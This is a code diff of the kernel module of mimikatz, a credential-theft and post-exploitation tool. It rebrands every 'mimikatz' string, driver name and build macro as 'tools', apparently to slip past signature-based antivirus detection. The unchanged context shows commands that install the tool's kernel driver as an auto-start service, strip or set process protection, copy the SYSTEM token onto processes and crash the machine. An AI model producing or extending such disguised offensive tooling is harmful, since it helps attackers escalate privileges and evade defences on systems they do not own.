@@ -6,8 +6,8 @@
 #include "kuhl_m_kernel.h"
 
 const KUHL_K_C kuhl_k_c_kernel[] = {
-	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start mimikatz driver (mimidrv)"},
-	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove mimikatz driver (mimidrv)"},
+	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start tools driver (mimidrv)"},
+	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove tools driver (mimidrv)"},
 	{NULL,								IOCTL_MIMIDRV_PING,					L"ping",			L"Ping the driver"},
 	{NULL,								IOCTL_MIMIDRV_BSOD,					L"bsod",			L"BSOD !"},
 	{NULL,								IOCTL_MIMIDRV_PROCESS_LIST,			L"process",			L"List process"},
@@ -56,10 +56,10 @@ NTSTATUS kuhl_m_kernel_do(wchar_t * input)
 NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[])
 {
 	wchar_t *absFile;
-	if(kull_m_file_getAbsolutePathOf(MIMIKATZ_DRIVER L".sys", &absFile))
+	if(kull_m_file_getAbsolutePathOf(TOOLS_DRIVER L".sys", &absFile))
 	{
 		if(kull_m_file_isFileExist(absFile))
-			kull_m_service_install(MIMIKATZ_DRIVER, MIMIKATZ L" driver (" MIMIKATZ_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
+			kull_m_service_install(TOOLS_DRIVER, TOOLS L" driver (" TOOLS_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
 		else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");
 		LocalFree(absFile);
 	}
@@ -69,7 +69,7 @@ NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_kernel_remove_mimidrv(int argc, wchar_t * argv[])
 {
-	kull_m_service_uninstall(MIMIKATZ_DRIVER);
+	kull_m_service_uninstall(TOOLS_DRIVER);
 	return STATUS_SUCCESS;
 }
 
@@ -79,7 +79,7 @@ NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
 	PCWCHAR szProcessName, szPid;
 	BOOL isUnprotect;
 
-	if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
+	if(TOOLS_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
 	{
 		isUnprotect = kull_m_string_args_byName(argc, argv, L"remove", NULL, NULL);
 		if(kull_m_string_args_byName(argc, argv, L"process", &szProcessName, NULL))
@@ -98,11 +98,11 @@ NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
 		{
 			if(!isUnprotect)
 			{
-				if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
+				if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
 				{
 					protectInfos.SignatureProtection.SignatureLevel = 1;
 				}
-				else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
+				else if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
 				{
 					protectInfos.SignatureProtection.SignatureLevel = 0x0f;
 					protectInfos.SignatureProtection.SectionSignatureLevel = 0x0f;
@@ -141,7 +141,7 @@ NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
 	if(!tokenInfo.fromProcessId)
 		kprintf(L" * from 0 will take SYSTEM token\n");
 	if(!tokenInfo.toProcessId)
-		kprintf(L" * to 0 will take all \'cmd\' and \'mimikatz\' process\n");
+		kprintf(L" * to 0 will take all \'cmd\' and \'tools\' process\n");
 
 	kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));
 
